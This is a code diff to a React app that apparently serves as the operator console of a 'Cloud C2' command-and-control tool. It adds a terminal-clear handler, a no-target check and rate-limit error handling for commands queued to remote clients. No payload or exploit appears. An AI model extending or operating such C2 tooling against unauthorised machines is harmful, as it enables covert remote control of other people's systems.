@@ -61,6 +61,12 @@ function AppInner() {
       return next.length > 200 ? next.slice(-200) : next;
     });
   }, []);
+  // Ctrl+L / clear button from Terminal
+  useEffect(() => {
+    const handler = () => setTermLogs(prev => prev.slice(-2));
+    window.addEventListener('term-clear' as any, handler);
+    return () => window.removeEventListener('term-clear' as any, handler);
+  }, []);
 
   const mergeAppIcons = useCallback((icons: Record<string, string>) => {
     setAppIcons(prev => ({ ...prev, ...icons }));
@@ -77,6 +83,12 @@ function AppInner() {
 
   const executeCommand = useCallback(async (cmd: string, silent: boolean = false) => {
     if (!cmd.trim()) return;
+    const hasTarget = !!(selectedClientId && clients.some(c => c.id === selectedClientId)) || clients.length > 0;
+    if (!hasTarget && !silent) {
+      setTermLogs(prev => [...prev, `[-] No target online — command not queued: ${cmd}`]);
+      showToast('No endpoint online');
+      return;
+    }
     const targetId = selectedClientId && clients.some(c => c.id === selectedClientId)
       ? selectedClientId
       : (clients[0]?.id || '');
@@ -92,11 +104,16 @@ function AppInner() {
         if (res.ok) {
           if (!silent) setTermLogs(prev => [...prev, `[+] Command queued via Cloud C2 for ${targetId}`]);
         } else {
-          if (!silent) setTermLogs(prev => [...prev, `[-] Cloud C2 error: ${res.statusText}`]);
+          const body = await res.text().catch(() => '');
+          const is429 = res.status === 429;
+          const msg = is429 ? `Rate limited (429) — retry after ${res.headers.get('Retry-After') || '?'}s` : `Cloud C2 error ${res.status}: ${res.statusText} ${body.slice(0, 120)}`;
+          if (!silent) setTermLogs(prev => [...prev, `[-] ${msg}`]);
+          if (is429) showToast(msg);
         }
       } else {
         await invoke('send_command', { clientId: targetId, command: cmd });
         if (!silent) setTermLogs(prev => [...prev, `[+] Command queued for ${targetId}`]);
+        // local mode: if no clients, warn was already handled above
       }
     } catch (err) {
       if (!silent) setTermLogs(prev => [...prev, `[-] Error sending command: ${err}`]);
